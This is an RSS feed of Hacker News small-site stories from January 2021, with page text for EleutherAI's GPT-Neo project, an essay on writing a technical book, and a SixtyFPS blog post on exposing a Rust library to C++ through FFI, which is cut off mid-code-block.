<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 20 Jan 2021 09:09:37 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 20 Jan 2021 09:09:37 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[EleutherAI Grassroots AI Research]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25819851">thread link</a>) | @sieste
<br/>
January 18, 2021 | https://www.eleuther.ai/home | <a href="https://web.archive.org/web/*/https://www.eleuther.ai/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" dir="ltr"><section id="h.56417b791d01314_3"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.56417b791d01314_0"><div><div><p dir="ltr"><span>Welcome to EleutherAI</span></p><h3 id="h.yplvx1u9vtry" dir="ltr"><span>A </span><span>grassroots collection of researchers working to open source AI research</span></h3></div></div></div></div></div></div></div></div></div></section><section id="h.17304fb9b5c7c976_7"></section><section id="h.28f621f06eb17180_0"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.4472ca32ff8ecf27_0"><div><div><p><img src="https://lh4.googleusercontent.com/0iaUmcGFWKfFLvIoe3SiIfhJTbuhuq346d_7Rm0sd8KRN0bJ3hRiGx4RC5dF8VwE3L2zbRpblpPFkfwcaTZgBPLVFrpZwyykwrD2YPk1QOuvppKgc3U=w1280" role="img"></p></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.28f621f06eb17180_8"><div><div><p dir="ltr"><span>GPT-Neo is the name of our codebase for transformer-based language models loosely styled around the GPT architecture. One of our goals is to use GPT-Neo to replicate a GPT-3 sized model and open source it to the public, for free.</span></p><p dir="ltr"><span>Along the way we will be running experiments with alternative architectures and attention types, releasing any intermediate models, and writing up any findings on our blog.</span></p><p dir="ltr"><span>Our models are built in </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2Ftensorflow%2Fmesh&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNF6FIwCHbJYVgqO0jjcB-6Os45nWg" target="_blank">Mesh TensorFlow</a></span><span>, which will allow us to scale up to GPT-3 sizes and beyond using simultaneous model and data parallelism.</span></p></div></div></div></div></div></div></div></div></div></section><section id="h.1adc72b8781560b9_0"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.7261759c41748bba_36"><div><div><p><img src="https://lh3.googleusercontent.com/UMiACu74px1tLPdmzuF66g5ztRinkD1cXIkUtZzsMOBsr4eCpqtng_dQ2PDtZfB0TunKxMS_=w1280" role="img"></p></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.1adc72b8781560b9_8"><div><div><p dir="ltr"><span>The Pile is a large, diverse, open source language modelling data set that consists of many smaller datasets combined together. The objective is to obtain text from as many modalities as possible to ensure that models trained using The Pile will have much broader generalization abilities. </span></p><p dir="ltr"><span>The Pile is now complete! </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fpile.eleuther.ai%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNECQC7Bl2tul7WmbwrvL8Z-XqyhrA" target="_blank">Check it out here</a></span>.</p></div></div></div></div></div></div></div></div></div></section><section id="h.1adc72b8781560b9_9"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.4472ca32ff8ecf27_21"><div><div><p><img src="https://lh3.googleusercontent.com/2PIPcJWvscZ9M5QaZKGx1uafqezi1-8k6O0aPhB_8Nczc7vuYaMLeSaljawVb0CYi65Ek-Dvw4iiTnUxbe7P9Qq2BAIzLIHqaBIBE2v0R3nhlPJXlr4=w1280" role="img"></p></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.1adc72b8781560b9_17"><div><div><p dir="ltr"><span>The core principle of WebText is to build a high-quality internet dataset by extracting URLs from Reddit submissions, scraping the URLs, and then performing filtering for quality (by upvotes) &amp; deduplication. As the dataset collected for training the original GPT-2 is not public, researchers independently reproduced the pipeline and released the resulting dataset, called </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fskylion007.github.io%2FOpenWebTextCorpus%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNGXUFn9yzq9hZKb6GGjC1iFv5Y0zQ" target="_blank">OpenWebTextCorpus (OWT)</a></span><span>.</span></p><p dir="ltr"><span>OpenWebText2 (OWT2) is an enhanced version of the original OpenWebTextCorpus covering all Reddit submissions from 2005 up until April 2020, with further months becoming available after the corresponding PushShift dump files are released.</span></p></div></div></div></div></div></div></div></div></div></section></div></div>]]>
            </description>
            <link>https://www.eleuther.ai/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819851</guid>
            <pubDate>Mon, 18 Jan 2021 09:20:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Technical Book]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25819806">thread link</a>) | @onerom
<br/>
January 18, 2021 | https://serhack.me/articles/how-to-write-technical-book/ | <a href="https://web.archive.org/web/*/https://serhack.me/articles/how-to-write-technical-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/technicalbook/headline.jpg" alt="The 4 steps to write a technical book"></p><p>For some people, publishing a book represents a dream, or lifelong goal, whereby they share a particular experience or subject matter expertise.</p><p>In narrative books, behind every story, there is a moral that is often hidden and not always easy to understand. With more “technical” books, it is different ― as it goes beyond simply sharing. More specifically, writing a technical book means being a point of reference with regard to a particular topic. When diving into a technical book, your reader will likely want to explore the “What if…” and “How do you…” questions.</p><p>Let’s start at the beginning. Sharing a product you have spent time, energy, and money on is rewarding. At least for me, it was! In December 2018, I published my first technical book (and definitely not my last) titled <a href="https://masteringmonero.com/">Mastering Monero</a> through <a href="https://kdp.amazon.com/">Amazon Self Publishing</a> and alongside a <a href="https://masteringmonero.com/#credits">team of great people</a>. It was exciting to receive early feedback from readers who praised both the content and writing style.</p><p>On the other hand, it was an intense and difficult journey. Writing a book is not easy and takes time ― a lot of time. I spent many days (and even some nights) imagining, refining, and rewriting the content without the help of a publishing house. Along with all this, I had to think about other aspects, such as marketing.</p><p>In an effort to help aspiring writers, I thought it might help to write an article with some essential tips for your journey. By following a few simple steps (some that were initially ignored by me), you will be able to enjoy a little more of the crazy adventure you are going to face: writing your first technical book!</p><p>In the following paragraphs, we will discuss:</p><ul><li>Choosing Your Idea: What Do You Want to Write About?</li><li>Selecting the Audience: How Do You Want to Write It?</li><li>Writing the Table of Contents or Outline</li><li>Contacting Potential Publishers</li></ul><h2 id="choosing-your-idea-what-do-you-want-to-write-about">Choosing Your Idea: What Do You Want to Write About?</h2><blockquote><p>“If there’s a book that you want to read, but it hasn’t been written yet, then you must write it.” – Toni Morrison</p></blockquote><p>“I have an idea…I’m going to write a book about X.” If that is what you thought this morning after a delicious breakfast and/or good coffee, I will stop you there. Any content, especially a technical book, requires a degree of expertise on the topic being discussed.</p><p>When writing a technical book, not only will you be showing an in-depth knowledge on the topic(s) discussed, you will also need to be able to convey complex information in a way that is easy for your readers to understand. Being able to explain complicated topics in a way that even your grandparents can understand shows your mastery of the particular subject matter being discussed.</p><p><img src="https://serhack.me/images/technicalbook/1_idea.jpg" alt="Choosing Your Idea"></p><p>Writing about areas of focus that you know intimately ― after having spent weeks, months, or even years studying ― will make the writing process faster and easier, since you will not have to do as much research. In addition, your writing will present you as a subject matter expert.</p><p>In some instances, you will find that while explaining a topic, you may have to research the subject matter in a bit more detail. This supplemental research and its supporting material will be beneficial to expanding your own knowledge base and helping set a basic, foundational understanding for your reader.</p><p>When considering a topic to write about, ask yourself about other books related to your subject matter that might already exist. Also, you should ask yourself why you should be the person to write about this topic. These are important questions that you should consider at the onset of your adventure. You might be hesitant, but determination counts for a lot!</p><p>If you just want to write your “dream book” and commercial success is not a major concern to you, then go ahead and just write whatever you would like! There is nothing wrong with this approach. Many authors begin by writing about the topic(s) that interest them most. The experience of writing your first book is invaluable, whether you sell 10 copies or 1,000 copies!</p><h2 id="selecting-the-audience-how-do-you-want-to-write-it">Selecting the Audience: How Do You Want to Write It?</h2><p>Without an <strong>audience</strong>, you have no perspective on the problem your book is solving other than your own experience. It is true that you should always try to solve your own problems first, but to be successful, you have to solve other people’s problems in the process. If you are not solving someone’s problem with your book, they will not buy it.</p><p>Put more simply, you will not have anyone to sell your book to. Sure, you can put your book up for sale on your website or on Amazon. It might sell a few copies, but having an audience that you can identify is critical to the success of publishing a book.</p><p>You do not necessarily have to write for a large market ― your audience does not have to be in the millions to get a book deal. What matters is that there should be enough potential buyers to make the book profitable for you and the publisher.</p><p><img src="https://serhack.me/images/technicalbook/2_public.jpg" alt="Find the right audience"></p><p>It is important to keep in mind that the audience sets the method of communication through which you will share your experience and knowledge. Unless, as an example, you are a university professor with tenure, avoid creating a purely academic and theoretical book. Otherwise, you readers will freak out!</p><p>Remember that you are not a professor, so ignore the idea of writing something like a university textbook. Getting a textbook adopted for a course is a rarity. For a textbook, most publishers will not engage with you unless you are a professor or a researcher with a PhD who is an expert in a specific field.</p><p>In your writing, be sure to give practical examples with solutions. When considering computer scientists, researchers, and engineers, they are looking for current information and knowledge that can be applied now to solve problems. It is fine to include relevant theory in a book for this audience, but keep it short and simple. Remember: write content that someone can use immediately.</p><h2 id="writing-the-table-of-contents-or-outline">Writing the Table of Contents or Outline</h2><p>A good way to start writing content is to sketch out your book. Your proposal should include a summary paragraph of the content, a definition of your intended audience, a statement of need and potential, and a tentative outline of the chapter title.</p><p><img src="https://serhack.me/images/technicalbook/3_write.jpg" alt="Writing Outline"></p><p>This is what a potential editor wants to see. In addition to this, many will want to see the preface and a sample chapter just to assess your writing ability and style. The entire exercise will provide you with a proposal to solicit publishers, but it will also reinforce your ideas.</p><p>Another important tip: Do not reinvent the wheel. Find as many other books and articles on your topic as possible and generate a list of them. Be comprehensive and scroll through (if not completely read) all of these sources.</p><p>Make a list of things you do not explicitly want to cover and reference the list of things you do not like about other books. Avoid the urge to start writing about elements of a topic you initially think are interesting unless you believe them to be relevant to your project.</p><p>For example, if a book is about the Bootstrap framework, you might not need an introduction to the history of HTML or how DNS works. On the other hand, an introduction to CSS and style rules might be a good section to include in your book.</p><p>When you have completed enough research to develop your ideas, you can use an outline to develop a draft of your proposal. As you write and review, you will continue to fill in details, add transitions, and present your acquired understanding of the subject matter.</p><p>Once you have completed a draft, let it sit for a few days before reading it again. This simple trick gives you a more unbiased view of your writing, and you will likely discover gaps you initially overlooked and improvements to be made.</p><p>Keep in mind that this is an outline of work and not a contract. As you continue your research, you may decide to organize the final proposal differently and even eliminate some information and add new sections.</p><p>If you follow the traditional model of publishing a book (i.e. with a publishing house), this section is for you. Once you have a specific topic for a book and a decent amount of content, it is a good time to talk with a publisher.</p><p><img src="https://serhack.me/images/technicalbook/4_publish.jpg" alt="Publish your technical book"></p><p>Take a look at books on the market that are similar to what you are writing to find out the names of publishers interested in your topic. Then, go to their website and contact an editor at the publisher to get a book proposal form. Publishers generally ask the same questions, though in different order.</p><p>A good proposal generally includes:</p><ul><li><p><strong>Your idea</strong> ― Provide a brief overview of the subject matter and how you want to discuss it. Be sure to write a summary built on top with all the key chapters. As always, it does not matter if you change this later. This just helps make your idea more concrete for the people who will be reviewing it.</p></li><li><p><strong>The market</strong> ― You need to explain to them why your book is a good idea. Speculate a bit about the potential market and communicate why you are the best possible author to write the book. Your goal is to convince publishers about your idea! Including years of experience and some events that have shaped your career might help too!</p></li><li><p><strong>A writing example</strong> ― To write a book, you need to show the publisher that you can write properly. Since editors will base their opinion on your sample, avoid grammatical errors or simple typos. From your text, they should be able to tell how interested you are in potentially publishing a book with them!</p></li></ul><p>In addition to what you have included in your cover letter, most will want to know how you might market it (e.g., blogs, websites, radio). And by “How you might market it?”, I mean that it will primarily be up to you to promote your book.</p><p>Send your proposal along with a cover letter to potential publishers. There are many, especially small ones like <a href="https://oreilly.com/">O’Reilly</a>, <a href="https://nostarch.com/">NoStarch</a>, and <a href="https://packtpub.com/">Packt</a>. I will write an article later regarding the top publishers that I think have great potential.</p><p>When in communication with a publisher, <strong>never accept rejection</strong>. When faced with rejection, another secret is that it often has …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serhack.me/articles/how-to-write-technical-book/">https://serhack.me/articles/how-to-write-technical-book/</a></em></p>]]>
            </description>
            <link>https://serhack.me/articles/how-to-write-technical-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819806</guid>
            <pubDate>Mon, 18 Jan 2021 09:14:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GPT-Neo recreating GPT-3 free open source]]>
            </title>
            <description>
<![CDATA[
Score 108 | Comments 47 (<a href="https://news.ycombinator.com/item?id=25819803">thread link</a>) | @sieste
<br/>
January 18, 2021 | https://www.eleuther.ai/gpt-neo | <a href="https://web.archive.org/web/*/https://www.eleuther.ai/gpt-neo">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main" dir="ltr"><section id="h.9ed95fdf8c1e1d9_74"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.7261759c41748bba_16"><div><div><p><img src="https://lh3.googleusercontent.com/H1AZ-PR0-JNbKwE_XoTHFBj-If_WUgfEeTtZidqWkwKVfySJQWu_TwcYNnrR_-NhY4hqDGPyGgHJIdF4GKMSvOxPXj71D6MgNhFZPGEqoOgaI_G0tts=w1280" role="img"></p></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.9ed95fdf8c1e1d9_71"><div><div><p dir="ltr"><span>GPT-Neo is the code name for a series of transformer-based language models loosely styled around the GPT architecture that we plan to train and open source. Our primary goal is to replicate a GPT-3 sized model and open source it to the public, for free. </span></p><p dir="ltr"><span>Along the way we will be running experiments with </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Farxiv.org%2Fabs%2F1701.06538&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHJmMleqfY7_hUomPrOnE0vc2d-VQ" target="_blank">alternative</a></span> <span><a href="https://www.google.com/url?q=https%3A%2F%2Farxiv.org%2Fabs%2F1911.03864&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFkViP0vtg72hlm50BfROBmFR67Ag" target="_blank">architectures</a></span><span> </span>and <span><a href="https://www.google.com/url?q=https%3A%2F%2Farxiv.org%2Fabs%2F2006.16236&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNECOymGhVzeI2sGyc6PufTta0RJlg" target="_blank">attention</a></span> <span><a href="https://www.google.com/url?q=https%3A%2F%2Fwww.aclweb.org%2Fanthology%2F2020.acl-main.672.pdf&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNE9TAomJh8x54cWNc_GMa-TnFV-Vg" target="_blank">types</a></span><span>, releasing any intermediate models, and writing up any findings on our blog. </span></p><p dir="ltr">We have a <span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherAI%2Fgpt-neo%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFoMdHQMTwRf6mrVBBHu1ZYPeY_3A" target="_blank">codebase</a></span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherAI%2Fgpt-neo%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFoMdHQMTwRf6mrVBBHu1ZYPeY_3A" target="_blank"> built in Tensorflow-mesh</a></span><span> (</span>for<span> training on TPU</span>s)<span>, and </span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherai%2Fgpt-neox&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFerlkNsmlncTy6qDAuYM9WyhVTtQ" target="_blank">one built </a></span><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherai%2Fgpt-neox&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFerlkNsmlncTy6qDAuYM9WyhVTtQ" target="_blank">with Deepspeed</a></span> (for training on GPUs). Both can scale to GPT-3+ sizes, but we currently lack the TPUs to train a 175B model to completion. Thankfully, we don't lack GPUs.</p><p dir="ltr"><span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherAI%2Fgpt-neo%2F&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFoMdHQMTwRf6mrVBBHu1ZYPeY_3A" target="_blank">GPT-Neo</a></span> is now fairly stable, and we will be releasing smaller scale models shortly. <span><a href="https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2FEleutherai%2Fgpt-neox&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNFerlkNsmlncTy6qDAuYM9WyhVTtQ" target="_blank">GPT-Neox</a></span> is still a work in progress, and we will be releasing more updates as the project moves forward.</p></div></div></div></div></div></div></div></div></div></section><section id="h.9ed95fdf8c1e1d9_82"><div><div tabindex="-1"><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.9ed95fdf8c1e1d9_79"><div><div><h3 id="h.i24o9xi2zff8" dir="ltr"><span><strong>Progress:</strong></span></h3><ul><li dir="ltr"><p dir="ltr">We<span> have the bulk of the model built, GPT-2 size models trained, and several experimental architectures implemented. </span></p></li><li dir="ltr"><p dir="ltr">Our current codebase should be able to scale up to GPT-3 sized models</p></li></ul></div></div></div></div></div></div></div><div><div><div jscontroller="sGwD4d" jsaction="zXBUYb:zTPCnb;zQF9Uc:Qxe3nd;" jsname="F57UId"><div><div id="h.9ed95fdf8c1e1d9_83"><div><div><h3 id="h.e8y7b91fgfoz" dir="ltr"><span><strong>Next Steps:</strong></span></h3><ul><li dir="ltr"><p dir="ltr">We are currently working on wrapping up GPT-2-sized model replication, looking mostly at evaluations there.</p></li><li dir="ltr"><p dir="ltr">The largest model we've gotten to train for a single step so far has been 200B parameters.</p></li></ul></div></div></div></div></div></div></div></div></div></section></div></div>]]>
            </description>
            <link>https://www.eleuther.ai/gpt-neo</link>
            <guid isPermaLink="false">hacker-news-small-sites-25819803</guid>
            <pubDate>Mon, 18 Jan 2021 09:13:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Expose a Rust Library to Other Languages (Esp. C++)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25819763">thread link</a>) | @tronical
<br/>
January 18, 2021 | https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/expose-rust-library-to-other-languages.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on January 13, 2021 by Olivier Goffart and Simon Hausmann</h5>
    
  <p>
    With <a href="https://sixtyfps.io/">SixtyFPS</a>, we are creating a GUI toolkit. We chose
    Rust as the implementation language for our runtime library, and we want to make the same library usable from different
    programming languages. We believe programmers in all languages need to build GUIs - powered by the same runtime library.
    Rust, with its Foreign Function Interface (FFI) is an excellent choice.<br> In
    this article we look at how to expose an idiomatic C++ API from our Rust library.
  </p>

<h3 id="the-challenge">The Challenge</h3>

    <p>Initially we chose to start with support for three languages:</p>
    <ul>
        <li><b>Rust</b>: Because it's our implementation language.</li>
        <li><b>C++</b>: It's a low level language that we're familiar with, and is still one of the most established languages
            in the embedded device space.</li>
        <li><b>JavaScript / TypeScript</b>: Because it's a very popular dynamic language.</li>
    </ul>


    <p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/diagrams.png"></p><p>The Rust library (also known as a crate) is split into two parts, the shared implementation crate and a thin idiomatic
        API crate.
    </p>
    <p>For JavaScript we use <a href="https://github.com/neon-bindings/neon">Neon</a> to expose an API. Neon enables us
        to conveniently write JavaScript APIs and create an NPM package.</p>
    <p>The C++ part is a bit more challenging.</p>

<h3 id="expose-idiomatic-cpp-api-through-ffi">Expose an Idiomatic C++ API through Rust FFI</h3>

    <p>We decided to keep the C++ API only in the header files. This is because, unlike with Rust, there's
        no widely adopted C++ equivalent of Cargo, to help with downloading and building dependencies. If we want to ship
        binaries, then we have to maintain ABI compatibility, which is difficult in C++.<br> This way, we can also keep the
        C++ binding as lightweight as possible: for performance and memory footprint.
    </p>
    
    <p>Rust cannot expose a C++ API: structures can only be exported using a C representation (<code>#[repr(C)]</code>) and
        <code>extern "C"</code> functions. This means that we cannot expose Rust features like traits, generics, or
        destructors even if they have a C++ equivalent.
     </p>
     
    <p>The Rust ecosystem provides a few helper crates to make the job easier:</p>
     <ul>
        <li><a href="https://github.com/eqrion/cbindgen"><b>cbindgen</b></a>: This helper crate automatically generates C/C++
            header files based on the <code>repr(C)</code> structure and the <code>extern "C"</code> functions. We use
            cbindgen to generate internal header files only. It's very helpful to avoid manually writing some unsafe error-prone
            boilerplate. 
        </li>
        <li><a href="https://github.com/mystor/rust-cpp">The <b>cpp</b> crate</a>: This
            helper crate is useful when calling C++ libraries from Rust, and we make use of that. However it is not suitable for
            exposing a C++ API from Rust. (Note: Olivier Goffart happens to be the maintainer.)
        </li>
                
        <li><a href="https://cxx.rs/">The <b>cxx</b> crate</a>: This would be a safer way than cbindgen to ensure that the
            interface between C++ and Rust is correct. While it could be useful, cbindgen already get us a long way. So
            we don't use it for now.
        </li>
    </ul>

<p>To build the correct shared library we use Cargo. The resulting library exports C mangled symbols. We ship
    a set of C++ header files that provide the C++ API and use the C functions behind the scenes. For convenience,
    we provide a CMake integration that ties together the library linkage and includes path setup. </p>

<h3 id="slices-vectors-strings">Slices, Vectors, and Strings</h3>

    <p>
    In FFI, passing a basic integer works out of the box. But what about more complex data types, like a 
    Rust slice or a string? Well, most classes like Rust's String, Vec, or slices are not <code>#[repr(C)]</code>,
    so we can't use them directly. While we could use these classes with an indirection, every simple call may need to go
    through a non-inline function boundary. So we would need to convert types, which means re-allocating memory.</p>
    <p>So instead of sharing code, we implemented data structures using <code>#[repr(C)]</code> and a stable ABI, so
        that they can be accessed directly from C++ and Rust, or any low-level language.</p>

   <p>For the slice we create a structure that holds a pointer and a size:</p>

<pre><code>#[repr(C)]
pub struct Slice&lt;'a, T&gt; {
    ptr: NonNull&lt;T&gt;,
    len: usize,
    phantom: PhantomData&lt;&amp;'a [T]&gt;,
}
</code></pre>

<p><code>Slice&lt;'a, T&gt;</code> can be dereferenced to <code>&amp;'a [T]</code>.
    In C++, cbindgen generates the following snippet:


</p><pre><code>template&lt;typename T&gt;
struct Slice {
    T *ptr;
    uintptr_t len;
};
</code></pre>

<p>We tell cbindgen to generate that code in a <code>cbindgen_private</code> namespace, and we wrap it an interface
similar to <code>std::span</code>.</p>

<p>We use strings and vectors to pass data between the engine and the user's code. This results in
    shared ownership where we want to avoid unnecessary copying of data. Our API is property based
    with setters and getters, therefore we implement shared ownership through
    <a href="https://en.wikipedia.org/wiki/Copy-on-write"></a>Implicit sharing / Copy-on-write. </p>

<p><img src="https://sixtyfps.io/blog/expose-rust-library-to-other-languages/sharedvector.png"></p><pre><code>#[repr(C)]
struct SharedVectorHeader {
    refcount: atomic::AtomicIsize,
    size: usize,
    capacity: usize,
}

#[repr(C)]
pub struct SharedVector&lt;T&gt; {
    inner: NonNull&lt;SharedVectorInner&lt;T&gt;&gt;,
}


/// These functions are called from the C++ constructor
/// and destructor
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_allocate(
    size: usize, align: usize) -&gt; *mut u8 { /*...*/ }
#[no_mangle]
pub unsafe extern "C" fn sixtyfps_shared_vector_free(
    ptr: *mut u8, size: usize, align: usize) { /*...*/ }
}
</code></pre>

<p>In Rust, the <code>impl Clone</code> and <code>impl Drop</code> make sure to increment
and decrement the atomic reference count and call the destructors. Similarly, in C++, we implement
copy constructor and destructor for the same purpose. Note that we still need to call the Rust
allocator function via the exposed C interface.</p>

<p>Now we can write a wrapper in C++:
(<a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/api/sixtyfps-cpp/include/sixtyfps_sharedvector.h">full file</a>)
</p>

<pre><code>template&lt;typename T&gt; struct SharedVector {
  SharedVector() : inner(nullptr) {}

  SharedVector(const SharedVector &amp;other)
    : inner(other.inner)
  { if (inner) ++inner-&gt;refcount; }

  ~SharedVector() {
     if (inner &amp;&amp; (--inner-&gt;refcount) == 0) {
        for (auto it = begin(); it &lt; end(); ++it)
            it-&gt;~T();
        cbindgen_private::sixtyfps_shared_vector_free(
            reinterpret_cast&lt;uint8_t *&gt;(inner),
            sizeof(SharedVectorHeader)
                + inner-&gt;capacity * sizeof(T),
            alignof(SharedVectorHeader));
     }
  }
  SharedVector &amp;operator=(const SharedVector &amp;other)
  { /*...*/ }

  const T *begin() const { /* ... */ }
  const T *end() const { /* ... */ }
  void push_back(const T &amp;value) { /* ... */ }
  // ... more vector-like API

private:
  // (SharedVectorHeader is generated by cbindgen)
  cbindgen_private::SharedVectorHeader *inner;
};
</code></pre>


    <p>Right now these types, such as <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a>, are within the internal <code>sixtyfps-corelib</code>
        crate, and re-exported for Rust users through the public <code>sixtyfps</code> crate.  If there is demand for it, we may consider moving them into a
        smaller public crate with its own release schedule.</p>


<h3 id="destructors">Destructors</h3>

    <p>It's important to note that <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedvector">SharedVector</a> and
        <a href="https://sixtyfps.io/docs/rust/sixtyfps/struct.sharedstring">SharedString</a> have destructors in C++.
        We can't pass instances by value in <code>extern "C"</code> functions, because the calling conventions are different
        for arguments or return types with C++ destructors; not supported by C. Therefore we can only pass them by pointer
        or reference.
    </p>

    <p>If we want to add a C++ destructor, constructor, or any member functions to types directly exported by cbindgen to our public API, 
        we use 
        <code><a href="https://docs.rs/cbindgen/0.16.0/cbindgen/struct.ExportConfig.html">cbindgen::ExportConfig</a>::body</code>:</p>

<pre><code>cbindgen_config.export.body.insert(
    "MyStruct".to_owned(),
    "    inline MyStruct(); inline ~MyStruct();".to_owned()
  );
</code></pre>

    <p>
    Then we implement <code>MyStruct::MyStruct</code> and <code>MyStruct::~MyStruct</code> in a manually
    written header file, by either doing the memory management directly or calling C helper functions
    implemented in Rust.</p>
     <p>It's important to keep in mind that anything allocated from Rust needs to be freed by Rust. 
    The same applies to allocations in C++: they might not share the same allocator.
    </p>

<h3 id="dynamic-dispatch">Dynamic Dispatch (virtual table) Across the Language Barrier</h3>

<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e2/Bon_toutou.png/186px-Bon_toutou.png"></p><p>
    Let's start with the classic example of dynamic dispatch in Rust:</p>
<pre><code>pub trait Animal {
  fn speak(&amp;self, loudness: i32) -&gt; String;
}
struct Dog { name: String }
impl Animal for Dog {
  fn speak(&amp;self, loudness: i32) -&gt; String
  { "Waf!".into() }
}
#[no_mangle]
pub extern "C" fn do_something_with(
  animal: &amp;dyn Animal
) {
  println!("{}", animal.speak(1));
}
</code></pre>

<p>Unfortunately the above code does not work. How could we implement a class <code>Cat</code>
in C++ and call the <code>do_something_with</code> function? What if we wanted to implement
<code>do_something_with</code> in C++? The problem is that trait objects (<code>&amp;dyn</code>) are not
valid in FFI - their binary representation is not guaranteed to be stable. If we try to compile the above code,
we get this warning:</p>

<pre><code>warning: `extern` fn uses type `dyn Animal`, which is not FFI-safe
  | extern "C" fn do_something_with(animal: &amp;dyn Animal)
  |                                         ^^^^^^^^^^^ not FFI-safe
  = note: `#[warn(improper_ctypes_definitions)]` on by default
  = note: trait objects have no C equivalent</code></pre>

  <!--https://doc.rust-lang.org/reference/types/trait-object.html-->
<p>Internally, <a href="https://brson.github.io/rust-anthology/1/all-about-trait-objects.html">we know</a> that
a trait object is composed of a pointer to the instance, and a pointer to a virtual table containing
pointers to functions. The layout of this trait object (which pointer comes first) and the layout of the virtual
table is an implementation detail of Rust. So we decided to re-implement them to work accross FFI. Instead of
writing a <code>trait Animal</code>, we write a virtual table by hand:</p>

<pre><code>#[repr(C)]
